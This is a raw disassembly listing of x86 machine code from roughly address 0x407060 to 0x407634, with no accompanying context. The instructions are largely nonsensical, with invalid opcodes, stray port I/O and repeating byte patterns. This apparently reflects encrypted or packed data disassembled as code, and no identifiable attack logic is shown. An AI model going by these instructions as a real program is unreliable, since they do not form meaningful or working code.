  407060:	6a 5f                	push   $0x5f
  407062:	9f                   	lahf
  407063:	b0 2b                	mov    $0x2b,%al
  407065:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407066:	90                   	nop
  407067:	48                   	dec    %eax
  407068:	25 2c 9f 5f f0       	and    $0xf05f9f2c,%eax
  40706d:	eb 66                	jmp    0x4070d5
  40706f:	48                   	dec    %eax
  407070:	1d 2c 9f 5f f0       	sbb    $0xf05f9f2c,%eax
  407075:	b7 88                	mov    $0x88,%bh
  407077:	ce                   	into
  407078:	9d                   	popf
  407079:	5f                   	pop    %edi
  40707a:	9f                   	lahf
  40707b:	eb 90                	jmp    0x40700d
  40707d:	e5 96                	in     $0x96,%eax
  40707f:	d5 ad                	aad    $0xad
  407081:	93                   	xchg   %eax,%ebx
  407082:	60                   	pusha
  407083:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  407088:	b0 49                	mov    $0x49,%al
  40708a:	34 60                	xor    $0x60,%al
  40708c:	a0 60 2d a5 94       	mov    0x94a52d60,%al
  407091:	48                   	dec    %eax
  407092:	83 28 9f             	subl   $0xffffff9f,(%eax)
  407095:	5f                   	pop    %edi
  407096:	2d a5 98 48 7b       	sub    $0x7b4898a5,%eax
  40709b:	28 9f 5f 2d a5 98    	sub    %bl,-0x675ad2a1(%edi)
  4070a1:	1a a0 62 a0 60 88    	sbb    -0x779f5f9e(%eax),%ah
  4070a7:	d2 6d 5f             	shrb   %cl,0x5f(%ebp)
  4070aa:	9f                   	lahf
  4070ab:	ed                   	in     (%dx),%eax
  4070ac:	e5 4c                	in     $0x4c,%eax
  4070ae:	f0 c8 a0 62 a0       	lock enter $0x62a0,$0xa0
  4070b3:	60                   	pusha
  4070b4:	2b a5 98 48 d5 2c    	sub    0x2cd54898(%ebp),%esp
  4070ba:	9f                   	lahf
  4070bb:	5f                   	pop    %edi
  4070bc:	f0 b6 88             	lock mov $0x88,%dh
  4070bf:	8e 9d 5f 9f e3 98    	mov    -0x671c60a1(%ebp),%ds
  4070c5:	61                   	popa
  4070c6:	bb 3b e3 ed e5       	mov    $0xe5ede33b,%ebx
  4070cb:	58                   	pop    %eax
  4070cc:	2b b5 8c 48 e9 2d    	sub    0x2de9488c(%ebp),%esi
  4070d2:	9f                   	lahf
  4070d3:	5f                   	pop    %edi
  4070d4:	24 3b                	and    $0x3b,%al
  4070d6:	14 71                	adc    $0x71,%al
  4070d8:	23 dd                	and    %ebp,%ebx
  4070da:	8c 60 14             	mov    %fs,0x14(%eax)
  4070dd:	6b 2d a5 94 eb f5 58 	imul   $0x58,0xf5eb94a5,%ebp
  4070e4:	88 78 6a             	mov    %bh,0x6a(%eax)
  4070e7:	5f                   	pop    %edi
  4070e8:	9f                   	lahf
  4070e9:	e4 7b                	in     $0x7b,%al
  4070eb:	d4 a6                	aam    $0xa6
  4070ed:	e3 1d                	jecxz  0x40710c
  4070ef:	4c                   	dec    %esp
  4070f0:	a0 d4 a4 e4 7b       	mov    0x7be4a4d4,%al
  4070f5:	d5 3f                	aad    $0x3f
  4070f7:	eb e5                	jmp    0x4070de
  4070f9:	5c                   	pop    %esp
  4070fa:	2b b5 94 48 6b 28    	sub    0x286b4894(%ebp),%esi
  407100:	9f                   	lahf
  407101:	5f                   	pop    %edi
  407102:	f6 48 71 5c          	testb  $0x5c,0x71(%eax)
  407106:	9f                   	lahf
  407107:	5f                   	pop    %edi
  407108:	f7 48 6b 5c 9f 5f d3 	testl  $0xd35f9f5c,0x6b(%eax)
  40710f:	20 fa                	and    %bh,%dl
  407111:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  407116:	8b 6a 89             	mov    -0x77(%edx),%ebp
  407119:	d4 62                	aam    $0x62
  40711b:	5f                   	pop    %edi
  40711c:	9f                   	lahf
  40711d:	48                   	dec    %eax
  40711e:	c7                   	(bad)
  40711f:	24 9f                	and    $0x9f,%al
  407121:	5f                   	pop    %edi
  407122:	d3 20                	shll   %cl,(%eax)
  407124:	fa                   	cli
  407125:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  40712a:	08 23                	or     %ah,(%ebx)
  40712c:	fc                   	cld
  40712d:	a0 a0 ed e5 48       	mov    0x48e5eda0,%al
  407132:	88 a2 68 5f 9f ed    	mov    %ah,-0x1260a098(%edx)
  407138:	e5 50                	in     $0x50,%eax
  40713a:	5a                   	pop    %edx
  40713b:	63 a0 60 a0 48 f9    	arpl   %esp,-0x6b75fa0(%eax)
  407141:	28 9f 5f 63 49 13    	sub    %bl,0x1349635f(%edi)
  407147:	23 9f 5f 8b 43 ff    	and    -0xbc74a1(%edi),%ebx
  40714d:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  407152:	63 60 a0             	arpl   %esp,-0x60(%eax)
  407155:	60                   	pusha
  407156:	a0 60 a0 5f 9f       	mov    0x9f5fa060,%al
  40715b:	5f                   	pop    %edi
  40715c:	9f                   	lahf
  40715d:	85 a0 60 a0 a9 16    	test   %esp,0x16a9a060(%eax)
  407163:	99                   	cltd
  407164:	10 ba d2 aa d7 b2    	adc    %bh,-0x4d28552e(%edx)
  40716a:	17                   	pop    %ss
  40716b:	da e7                	(bad)
  40716d:	c4                   	(bad)
  40716e:	e8 a7 f2 a7 e4       	call   0xe4e8641a
  407173:	d9 03                	flds   (%ebx)
  407175:	d2 0f                	rorb   %cl,(%edi)
  407177:	97                   	xchg   %eax,%edi
  407178:	18 ad f7 b3 d2 b3    	sbb    %ch,-0x4c2d4c09(%ebp)
  40717e:	f1                   	int1
  40717f:	ca ea c8             	lret   $0xc8ea
  407182:	03 c2                	add    %edx,%eax
  407184:	e2 b2                	loop   0x407138
  407186:	a0 60 a0 b5 2b       	mov    0x2bb5a060,%al
  40718b:	4c                   	dec    %esp
  40718c:	d3 20                	shll   %cl,(%eax)
  40718e:	f5                   	cmc
  40718f:	c8 c5 bd e0          	enter  $0xbdc5,$0xe0
  407193:	60                   	pusha
  407194:	04 5f                	add    $0x5f,%al
  407196:	d0 c4                	rol    $1,%ah
  407198:	29 80 9f 65 40 16    	sub    %eax,0x1640659f(%eax)
  40719e:	e0 60                	loopne 0x407200
  4071a0:	d3 20                	shll   %cl,(%eax)
  4071a2:	fa                   	cli
  4071a3:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4071a8:	08 8c fd a0 a0 23 89 	or     %cl,-0x76dc5f60(%ebp,%edi,8)
  4071af:	6a 63                	push   $0x63
  4071b1:	5f                   	pop    %edi
  4071b2:	9f                   	lahf
  4071b3:	4b                   	dec    %ebx
  4071b4:	98                   	cwtl
  4071b5:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  4071ba:	cd 00                	int    $0x0
  4071bc:	56                   	push   %esi
  4071bd:	a0 a0 61 63 b5       	mov    0xb56361a0,%al
  4071c2:	2b 4c 23 24          	sub    0x24(%ebx,%eiz,1),%ecx
  4071c6:	98                   	cwtl
  4071c7:	b3 f6                	mov    $0xf6,%bl
  4071c9:	e9 f5 5c 2b 50       	jmp    0x506bcec3
  4071ce:	2b a5 9c 48 ab 2b    	sub    0x2bab489c(%ebp),%esp
  4071d4:	9f                   	lahf
  4071d5:	5f                   	pop    %edi
  4071d6:	d3 20                	shll   %cl,(%eax)
  4071d8:	f5                   	cmc
  4071d9:	c8 3c bd e0          	enter  $0xbd3c,$0xe0
  4071dd:	60                   	pusha
  4071de:	04 5f                	add    $0x5f,%al
  4071e0:	d0 c4                	rol    $1,%ah
  4071e2:	29 80 d3 3b 2d a5    	sub    %eax,-0x5ad2c42d(%eax)
  4071e8:	98                   	cwtl
  4071e9:	b0 08                	mov    $0x8,%al
  4071eb:	79 a0                	jns    0x40718d
  4071ed:	62 a0 ca a0 eb e5    	bound  %esp,-0x1a145f36(%eax)
  4071f3:	5c                   	pop    %esp
  4071f4:	88 58 6a             	mov    %bl,0x6a(%eax)
  4071f7:	5f                   	pop    %edi
  4071f8:	9f                   	lahf
  4071f9:	b0 f6                	mov    $0xf6,%al
  4071fb:	48                   	dec    %eax
  4071fc:	31 36                	xor    %esi,(%esi)
  4071fe:	9f                   	lahf
  4071ff:	5f                   	pop    %edi
  407200:	25 20 15 6b 53       	and    $0x536b1520,%eax
  407205:	61                   	popa
  407206:	2b a5 98 b0 88 da    	sub    -0x25774f68(%ebp),%esp
  40720c:	76 5f                	jbe    0x40726d
  40720e:	9f                   	lahf
  40720f:	93                   	xchg   %eax,%ebx
  407210:	60                   	pusha
  407211:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  407216:	b0 c8                	mov    $0xc8,%al
  407218:	43                   	inc    %ebx
  407219:	bd e0 60 2d a5       	mov    $0xa52d60e0,%ebp
  40721e:	9c                   	pushf
  40721f:	48                   	dec    %eax
  407220:	f5                   	cmc
  407221:	27                   	daa
  407222:	9f                   	lahf
  407223:	5f                   	pop    %edi
  407224:	63 49 33             	arpl   %ecx,0x33(%ecx)
  407227:	22 9f 5f 8b 50 2b    	and    0x2b508b5f(%edi),%bl
  40722d:	23 fe                	and    %esi,%edi
  40722f:	bb f9 b9 fd 23       	mov    $0x23fdb9f9,%ebx
  407234:	30 b5 2b 4c d3 20    	xor    %dh,0x20d34c2b(%ebp)
  40723a:	f5                   	cmc
  40723b:	c8 71 bd e0          	enter  $0xbd71,$0xe0
  40723f:	60                   	pusha
  407240:	04 5f                	add    $0x5f,%al
  407242:	d0 c4                	rol    $1,%ah
  407244:	29 80 9f 65 44 16    	sub    %eax,0x1644659f(%eax)
  40724a:	e0 60                	loopne 0x4072ac
  40724c:	d3 20                	shll   %cl,(%eax)
  40724e:	fa                   	cli
  40724f:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  407254:	08 38                	or     %bh,(%eax)
  407256:	fd                   	std
  407257:	a0 a0 23 89 be       	mov    0xbe8923a0,%al
  40725c:	62 5f 9f             	bound  %ebx,-0x61(%edi)
  40725f:	4b                   	dec    %ebx
  407260:	98                   	cwtl
  407261:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  407266:	cd 04                	int    $0x4
  407268:	56                   	push   %esi
  407269:	a0 a0 61 63 b3       	mov    0xb36361a0,%al
  40726e:	f6 b7 23 24 90 26    	divb   0x26902423(%edi)
  407274:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407275:	84 a0 ed e4 84 a4    	test   %ah,-0x5b7b1b13(%eax)
  40727b:	b0 0a                	mov    $0xa,%al
  40727d:	5f                   	pop    %edi
  40727e:	0a 68 88             	or     -0x78(%eax),%ch
  407281:	e4 76                	in     $0x76,%al
  407283:	5f                   	pop    %edi
  407284:	9f                   	lahf
  407285:	b0 88                	mov    $0x88,%al
  407287:	56                   	push   %esi
  407288:	75 5f                	jne    0x4072e9
  40728a:	9f                   	lahf
  40728b:	eb 78                	jmp    0x407305
  40728d:	e5 7b                	in     $0x7b,%eax
  40728f:	d5 c0                	aad    $0xc0
  407291:	48                   	dec    %eax
  407292:	33 36                	xor    (%esi),%esi
  407294:	9f                   	lahf
  407295:	5f                   	pop    %edi
  407296:	dd 50 a3             	fstl   -0x5d(%eax)
  407299:	60                   	pusha
  40729a:	a0 d5 b4 ed e4       	mov    0xe4edb4d5,%al
  40729f:	84 a4 b0 0a 68 88 b8 	test   %ah,-0x477797f6(%eax,%esi,4)
  4072a6:	76 5f                	jbe    0x407307
  4072a8:	9f                   	lahf
  4072a9:	b0 88                	mov    $0x88,%al
  4072ab:	2a 75 5f             	sub    0x5f(%ebp),%dh
  4072ae:	9f                   	lahf
  4072af:	eb 78                	jmp    0x407329
  4072b1:	e5 7b                	in     $0x7b,%eax
  4072b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4072b4:	24 ef                	and    $0xef,%al
  4072b6:	a0 60 a0 18 a0       	mov    0xa018a060,%al
  4072bb:	64 a0 60 88 e6 53    	mov    %fs:0x53e68860,%al
  4072c1:	5f                   	pop    %edi
  4072c2:	9f                   	lahf
  4072c3:	eb 90                	jmp    0x407255
  4072c5:	ed                   	in     (%dx),%eax
  4072c6:	e4 84                	in     $0x84,%al
  4072c8:	a8 b0                	test   $0xb0,%al
  4072ca:	08 60 a4             	or     %ah,-0x5c(%eax)
  4072cd:	60                   	pusha
  4072ce:	a0 b6 0a 62 2b       	mov    0x2b620ab6,%al
  4072d3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4072d4:	c4 74 f0 48          	les    0x48(%eax,%esi,8),%esi
  4072d8:	35 35 9f 5f 2b       	xor    $0x2b5f9f35,%eax
  4072dd:	38 2b                	cmp    %ch,(%ebx)
  4072df:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4072e0:	c4 64 f0 48          	les    0x48(%eax,%esi,8),%esp
  4072e4:	51                   	push   %ecx
  4072e5:	35 9f 5f 25 3b       	xor    $0x3b255f9f,%eax
  4072ea:	14 b5                	adc    $0xb5,%al
  4072ec:	2d a4 c4 6c f0       	sub    $0xf06cc4a4,%eax
  4072f1:	ca a0 ca             	lret   $0xcaa0
  4072f4:	a0 ca a0 ca a0       	mov    0xa0caa0ca,%al
  4072f9:	ca a0 ca             	lret   $0xcaa0
  4072fc:	a0 c8 c0 62 a0       	mov    0xa062c0c8,%al
  407301:	60                   	pusha
  407302:	0a 80 0a 62 08 68    	or     0x6808620a(%eax),%al
  407308:	42                   	inc    %edx
  407309:	a0 a0 48 e9 35       	mov    0x35e948a0,%al
  40730e:	9f                   	lahf
  40730f:	5f                   	pop    %edi
  407310:	2b 7e eb             	sub    -0x15(%esi),%edi
  407313:	e5 7b                	in     $0x7b,%eax
  407315:	dc c0                	fadd   %st,%st(0)
  407317:	a3 d3 5f 2b a4       	mov    %eax,0xa42b5fd3
  40731c:	9e                   	sahf
  40731d:	64 f0 eb e4          	fs lock jmp 0x407305
  407321:	84 b0 b0 88 98 75    	test   %dh,0x759888b0(%eax)
  407327:	5f                   	pop    %edi
  407328:	9f                   	lahf
  407329:	e5 60                	in     $0x60,%eax
  40732b:	d4 a6                	aam    $0xa6
  40732d:	26 a4                	movsb  %es:(%esi),%es:(%edi)
  40732f:	84 a1 4b a4 a7 eb    	test   %ah,-0x14585bb5(%ecx)
  407335:	d5 83                	aad    $0x83
  407337:	eb e4                	jmp    0x40731d
  407339:	84 ac b0 88 88 75 5f 	test   %ch,0x5f758888(%eax,%esi,4)
  407340:	9f                   	lahf
  407341:	eb 66                	jmp    0x4073a9
  407343:	48                   	dec    %eax
  407344:	b9 13 9f 5f 2a       	mov    $0x2a5f9f13,%ecx
  407349:	64 c4 e3 64 70       	(bad)
  40734e:	ff                   	(bad)
  40734f:	be fb 23 2d a0       	mov    $0xa02d23fb,%esi
  407354:	a0 b5 2b 4c 59       	mov    0x594c2bb5,%al
  407359:	7c a0                	jl     0x4072fb
  40735b:	60                   	pusha
  40735c:	a0 ca a0 ca a0       	mov    0xa0caa0ca,%al
  407361:	a9 15 59 f3 b6       	test   $0xb6f35915,%eax
  407366:	f7 e9                	imul   %ecx
  407368:	e5 5c                	in     $0x5c,%eax
  40736a:	d3 20                	shll   %cl,(%eax)
  40736c:	f5                   	cmc
  40736d:	c8 a0 c2 e0          	enter  $0xc2a0,$0xe0
  407371:	60                   	pusha
  407372:	04 5f                	add    $0x5f,%al
  407374:	d0 c4                	rol    $1,%ah
  407376:	29 80 2b a5 9c 48    	sub    %eax,0x489ca52b(%eax)
  40737c:	99                   	cltd
  40737d:	25 9f 5f d3 20       	and    $0x20d35f9f,%eax
  407382:	f5                   	cmc
  407383:	c8 70 c1 e0          	enter  $0xc170,$0xe0
  407387:	60                   	pusha
  407388:	04 5f                	add    $0x5f,%al
  40738a:	d0 c4                	rol    $1,%ah
  40738c:	29 80 67 e5 08 5f    	sub    %eax,0x5f08e567(%eax)
  407392:	9f                   	lahf
  407393:	5f                   	pop    %edi
  407394:	34 60                	xor    $0x60,%al
  407396:	a0 60 2d e5 08       	mov    0x8e52d60,%al
  40739b:	5f                   	pop    %edi
  40739c:	9f                   	lahf
  40739d:	5f                   	pop    %edi
  40739e:	f0 48                	lock dec %eax
  4073a0:	3d 35 9f 5f 2b       	cmp    $0x2b5f9f35,%eax
  4073a5:	e5 18                	in     $0x18,%eax
  4073a7:	5f                   	pop    %edi
  4073a8:	9f                   	lahf
  4073a9:	5f                   	pop    %edi
  4073aa:	23 48 a1             	and    -0x5f(%eax),%ecx
  4073ad:	d2 ae d4 d4 a8 af    	shrb   %cl,-0x50572b2c(%esi)
  4073b3:	e4 dc                	in     $0xdc,%al
  4073b5:	61                   	popa
  4073b6:	a0 60 89 16 a1       	mov    0xa1168960,%al
  4073bb:	60                   	pusha
  4073bc:	a0 ed 2d c4 9f       	mov    0x9fc42ded,%al
  4073c1:	5f                   	pop    %edi
  4073c2:	9f                   	lahf
  4073c3:	93                   	xchg   %eax,%ebx
  4073c4:	72 18                	jb     0x4073de
  4073c6:	b8 c2 e0 60 88       	mov    $0x8860e0c2,%eax
  4073cb:	96                   	xchg   %eax,%esi
  4073cc:	88 5f 9f             	mov    %bl,-0x61(%edi)
  4073cf:	eb 35                	jmp    0x407406
  4073d1:	c4 9f 5f 9f eb e5    	les    -0x1a1460a1(%edi),%ebx
  4073d7:	5c                   	pop    %esp
  4073d8:	88 84 67 5f 9f eb e5 	mov    %al,-0x1a1460a1(%edi,%eiz,2)
  4073df:	5c                   	pop    %esp
  4073e0:	89 ee                	mov    %ebp,%esi
  4073e2:	a1 60 a0 eb 25       	mov    0x25eba060,%eax
  4073e7:	cc                   	int3
  4073e8:	9f                   	lahf
  4073e9:	5f                   	pop    %edi
  4073ea:	9f                   	lahf
  4073eb:	93                   	xchg   %eax,%ebx
  4073ec:	72 b2                	jb     0x4073a0
  4073ee:	f0 ed                	lock in (%dx),%eax
  4073f0:	25 bc 9f 5f 9f       	and    $0x9f5f9fbc,%eax
  4073f5:	48                   	dec    %eax
  4073f6:	83 3f 9f             	cmpl   $0xffffff9f,(%edi)
  4073f9:	5f                   	pop    %edi
  4073fa:	9f                   	lahf
  4073fb:	15 fc 5f 9f 5f       	adc    $0x5f9f5ffc,%eax
  407400:	08 bc 02 a0 a0 eb 25 	or     %bh,0x25eba0a0(%edx,%eax,1)
  407407:	d0 9f 5f 9f 93 72    	rcrb   $1,0x72939f5f(%edi)
  40740d:	b2 f0                	mov    $0xf0,%dl
  40740f:	ed                   	in     (%dx),%eax
  407410:	25 b8 9f 5f 9f       	and    $0x9f5f9fb8,%eax
  407415:	48                   	dec    %eax
  407416:	63 3f                	arpl   %edi,(%edi)
  407418:	9f                   	lahf
  407419:	5f                   	pop    %edi
  40741a:	9f                   	lahf
  40741b:	15 f8 5f 9f 5f       	adc    $0x5f9f5ff8,%eax
  407420:	2d e5 00 5f 9f       	sub    $0x9f5f00e5,%eax
  407425:	5f                   	pop    %edi
  407426:	5a                   	pop    %edx
  407427:	63 a0 60 a0 48 29    	arpl   %esp,0x2948a060(%eax)
  40742d:	27                   	daa
  40742e:	9f                   	lahf
  40742f:	5f                   	pop    %edi
  407430:	2b e5                	sub    %ebp,%esp
  407432:	00 5f 9f             	add    %bl,-0x61(%edi)
  407435:	5f                   	pop    %edi
  407436:	f0 ed                	lock in (%dx),%eax
  407438:	2d b4 9f 5f 9f       	sub    $0x9f5f9fb4,%eax
  40743d:	93                   	xchg   %eax,%ebx
  40743e:	72 18                	jb     0x407458
  407440:	08 c2                	or     %al,%dl
  407442:	e0 60                	loopne 0x4074a4
  407444:	88 1c 87             	mov    %bl,(%edi,%eax,4)
  407447:	5f                   	pop    %edi
  407448:	9f                   	lahf
  407449:	eb 35                	jmp    0x407480
  40744b:	b4 9f                	mov    $0x9f,%ah
  40744d:	5f                   	pop    %edi
  40744e:	9f                   	lahf
  40744f:	b8 88 48 67 5f       	mov    $0x5f674888,%eax
  407454:	9f                   	lahf
  407455:	d3 f0                	shl    %cl,%eax
  407457:	eb e5                	jmp    0x40743e
  407459:	5c                   	pop    %esp
  40745a:	9f                   	lahf
  40745b:	90                   	nop
  40745c:	2d ed f0 5f 9f       	sub    $0x9f5ff0ed,%eax
  407461:	5f                   	pop    %edi
  407462:	d3 32                	shll   %cl,(%edx)
  407464:	58                   	pop    %eax
  407465:	e8 02 a0 a0 48       	call   0x48e1146c
  40746a:	37                   	aaa
  40746b:	47                   	inc    %edi
  40746c:	9f                   	lahf
  40746d:	5f                   	pop    %edi
  40746e:	9f                   	lahf
  40746f:	15 f0 5f 9f 5f       	adc    $0x5f9f5ff0,%eax
  407474:	2d e5 ec 5f 9f       	sub    $0x9f5fece5,%eax
  407479:	5f                   	pop    %edi
  40747a:	2d f5 1c 5f 9f       	sub    $0x9f5f1cf5,%eax
  40747f:	5f                   	pop    %edi
  407480:	59                   	pop    %ecx
  407481:	e0 a0                	loopne 0x407423
  407483:	60                   	pusha
  407484:	a0 48 f7 26 9f       	mov    0x9f26f748,%al
  407489:	5f                   	pop    %edi
  40748a:	9f                   	lahf
  40748b:	15 ec 5f 9f 5f       	adc    $0x5f9f5fec,%eax
  407490:	08 10                	or     %dl,(%eax)
  407492:	02 a0 a0 eb e5 5c    	add    0x5ce5eba0(%eax),%ah
  407498:	5a                   	pop    %edx
  407499:	64 a0 60 a0 48 b7    	mov    %fs:0xb748a060,%al
  40749f:	27                   	daa
  4074a0:	9f                   	lahf
  4074a1:	5f                   	pop    %edi
  4074a2:	89 2c a0             	mov    %ebp,(%eax,%eiz,4)
  4074a5:	60                   	pusha
  4074a6:	a0 eb e5 5c 9f       	mov    0x9f5ce5eb,%al
  4074ab:	90                   	nop
  4074ac:	2d ed e8 5f 9f       	sub    $0x9f5fe8ed,%eax
  4074b1:	5f                   	pop    %edi
  4074b2:	d3 32                	shll   %cl,(%edx)
  4074b4:	58                   	pop    %eax
  4074b5:	1c 02                	sbb    $0x2,%al
  4074b7:	a0 a0 48 e7 47       	mov    0x47e748a0,%al
  4074bc:	9f                   	lahf
  4074bd:	5f                   	pop    %edi
  4074be:	9f                   	lahf
  4074bf:	15 e8 5f 9f 5f       	adc    $0x5f9f5fe8,%eax
  4074c4:	2d e5 e4 5f 9f       	sub    $0x9f5fe4e5,%eax
  4074c9:	5f                   	pop    %edi
  4074ca:	2d f5 1c 5f 9f       	sub    $0x9f5f1cf5,%eax
  4074cf:	5f                   	pop    %edi
  4074d0:	59                   	pop    %ecx
  4074d1:	e0 a0                	loopne 0x407473
  4074d3:	60                   	pusha
  4074d4:	a0 48 a7 26 9f       	mov    0x9f26a748,%al
  4074d9:	5f                   	pop    %edi
  4074da:	9f                   	lahf
  4074db:	15 e4 5f 9f 5f       	adc    $0x5f9f5fe4,%eax
  4074e0:	08 10                	or     %dl,(%eax)
  4074e2:	02 a0 a0 eb e5 5c    	add    0x5ce5eba0(%eax),%ah
  4074e8:	5a                   	pop    %edx
  4074e9:	64 a0 60 a0 48 67    	mov    %fs:0x6748a060,%al
  4074ef:	26 9f                	es lahf
  4074f1:	5f                   	pop    %edi
  4074f2:	8b df                	mov    %edi,%ebx
  4074f4:	23 1d 0c 5f 9f 5f    	and    0x5f9f5f0c,%ebx
  4074fa:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4074fb:	d5 f3                	aad    $0xf3
  4074fd:	e3 5d                	jecxz  0x40755c
  4074ff:	d0 9f 5f 9f 60 16    	rcrb   $1,0x16609f5f(%edi)
  407505:	85 2d ed e0 5f 9f    	test   %ebp,0x9f5fe0ed
  40750b:	5f                   	pop    %edi
  40750c:	d3 32                	shll   %cl,(%edx)
  40750e:	58                   	pop    %eax
  40750f:	48                   	dec    %eax
  407510:	02 a0 a0 48 8d 46    	add    0x468d48a0(%eax),%ah
  407516:	9f                   	lahf
  407517:	5f                   	pop    %edi
  407518:	2b f5                	sub    %ebp,%esi
  40751a:	e0 5f                	loopne 0x40757b
  40751c:	9f                   	lahf
  40751d:	5f                   	pop    %edi
  40751e:	2b a5 9c 48 7b 25    	sub    0x257b489c(%ebp),%esp
  407524:	9f                   	lahf
  407525:	5f                   	pop    %edi
  407526:	2b a5 9c 4b e8 ed    	sub    -0x1217b464(%ebp),%esp
  40752c:	2d 9c 9f 5f 9f       	sub    $0x9f5f9f9c,%eax
  407531:	93                   	xchg   %eax,%ebx
  407532:	72 18                	jb     0x40754c
  407534:	b4 c3                	mov    $0xc3,%ah
  407536:	e0 60                	loopne 0x407598
  407538:	88 28                	mov    %ch,(%eax)
  40753a:	86 5f 9f             	xchg   %bl,-0x61(%edi)
  40753d:	eb 35                	jmp    0x407574
  40753f:	9c                   	pushf
  407540:	9f                   	lahf
  407541:	5f                   	pop    %edi
  407542:	9f                   	lahf
  407543:	eb e5                	jmp    0x40752a
  407545:	5c                   	pop    %esp
  407546:	88 16                	mov    %dl,(%esi)
  407548:	65 5f                	gs pop %edi
  40754a:	9f                   	lahf
  40754b:	eb e5                	jmp    0x407532
  40754d:	5c                   	pop    %esp
  40754e:	8b 83 2d ed d8 5f    	mov    0x5fd8ed2d(%ebx),%eax
  407554:	9f                   	lahf
  407555:	5f                   	pop    %edi
  407556:	d3 32                	shll   %cl,(%edx)
  407558:	58                   	pop    %eax
  407559:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40755a:	03 a0 a0 48 43 46    	add    0x464348a0(%eax),%esp
  407560:	9f                   	lahf
  407561:	5f                   	pop    %edi
  407562:	2b f5                	sub    %ebp,%esi
  407564:	d8 5f 9f             	fcomps -0x61(%edi)
  407567:	5f                   	pop    %edi
  407568:	2b a5 9c 48 31 25    	sub    0x2531489c(%ebp),%esp
  40756e:	9f                   	lahf
  40756f:	5f                   	pop    %edi
  407570:	2b a5 9c eb e5 5c    	sub    0x5ce5eb9c(%ebp),%esp
  407576:	9f                   	lahf
  407577:	90                   	nop
  407578:	2b e5                	sub    %ebp,%esp
  40757a:	0c 5f                	or     $0x5f,%al
  40757c:	9f                   	lahf
  40757d:	5f                   	pop    %edi
  40757e:	d3 32                	shll   %cl,(%edx)
  407580:	f2 b0 2d             	repnz mov $0x2d,%al
  407583:	e5 d4                	in     $0xd4,%eax
  407585:	5f                   	pop    %edi
  407586:	9f                   	lahf
  407587:	5f                   	pop    %edi
  407588:	88 b0 7e 5f 9f 5f    	mov    %dh,0x5f9f5f7e(%eax)
  40758e:	55                   	push   %ebp
  40758f:	94                   	xchg   %eax,%esp
  407590:	9f                   	lahf
  407591:	5f                   	pop    %edi
  407592:	9f                   	lahf
  407593:	c8 fc c2 e0          	enter  $0xc2fc,$0xe0
  407597:	60                   	pusha
  407598:	2b e5                	sub    %ebp,%esp
  40759a:	10 5f 9f             	adc    %bl,-0x61(%edi)
  40759d:	5f                   	pop    %edi
  40759e:	d3 32                	shll   %cl,(%edx)
  4075a0:	f2 b0 2d             	repnz mov $0x2d,%al
  4075a3:	e5 d0                	in     $0xd0,%eax
  4075a5:	5f                   	pop    %edi
  4075a6:	9f                   	lahf
  4075a7:	5f                   	pop    %edi
  4075a8:	88 90 7e 5f 9f 5f    	mov    %dl,0x5f9f5f7e(%eax)
  4075ae:	55                   	push   %ebp
  4075af:	90                   	nop
  4075b0:	9f                   	lahf
  4075b1:	5f                   	pop    %edi
  4075b2:	9f                   	lahf
  4075b3:	c8 50 c2 e0          	enter  $0xc250,$0xe0
  4075b7:	60                   	pusha
  4075b8:	2b a5 9c 1a a5 60    	sub    0x60a51a9c(%ebp),%esp
  4075be:	a0 60 88 54 65       	mov    0x65548860,%al
  4075c3:	5f                   	pop    %edi
  4075c4:	9f                   	lahf
  4075c5:	eb e5                	jmp    0x4075ac
  4075c7:	5c                   	pop    %esp
  4075c8:	9f                   	lahf
  4075c9:	90                   	nop
  4075ca:	2d ed cc 5f 9f       	sub    $0x9f5fcced,%eax
  4075cf:	5f                   	pop    %edi
  4075d0:	d3 32                	shll   %cl,(%edx)
  4075d2:	58                   	pop    %eax
  4075d3:	d0 03                	rolb   $1,(%ebx)
  4075d5:	a0 a0 48 c9 46       	mov    0x46c948a0,%al
  4075da:	9f                   	lahf
  4075db:	5f                   	pop    %edi
  4075dc:	9f                   	lahf
  4075dd:	15 cc 5f 9f 5f       	adc    $0x5f9f5fcc,%eax
  4075e2:	2d f5 c8 5f 9f       	sub    $0x9f5fc8f5,%eax
  4075e7:	5f                   	pop    %edi
  4075e8:	af                   	scas   %es:(%edi),%eax
  4075e9:	17                   	pop    %ss
  4075ea:	25 d4 9f 5f 9f       	and    $0x9f5f9fd4,%eax
  4075ef:	48                   	dec    %eax
  4075f0:	9d                   	popf
  4075f1:	3c 9f                	cmp    $0x9f,%al
  4075f3:	5f                   	pop    %edi
  4075f4:	9f                   	lahf
  4075f5:	15 c8 5f 9f 5f       	adc    $0x5f9f5fc8,%eax
  4075fa:	2d ed c4 5f 9f       	sub    $0x9f5fc4ed,%eax
  4075ff:	5f                   	pop    %edi
  407600:	d3 32                	shll   %cl,(%edx)
  407602:	58                   	pop    %eax
  407603:	f4                   	hlt
  407604:	03 a0 a0 48 99 45    	add    0x459948a0(%eax),%esp
  40760a:	9f                   	lahf
  40760b:	5f                   	pop    %edi
  40760c:	9f                   	lahf
  40760d:	15 c4 5f 9f 5f       	adc    $0x5f9f5fc4,%eax
  407612:	2b a5 9c 1a a4 60    	sub    0x60a41a9c(%ebp),%esp
  407618:	a0 60 88 fa 65       	mov    0x65fa8860,%al
  40761d:	5f                   	pop    %edi
  40761e:	9f                   	lahf
  40761f:	e3 5d                	jecxz  0x40767e
  407621:	d8 9f 5f 9f 62 15    	fcomps 0x15629f5f(%edi)
  407627:	87 2d e5 c0 5f 9f    	xchg   %ebp,0x9f5fc0e5
  40762d:	5f                   	pop    %edi
  40762e:	2d f5 1c 5f 9f       	sub    $0x9f5f1cf5,%eax
  407633:	5f                   	pop    %edi
  407634:	59                   	pop    %ecx
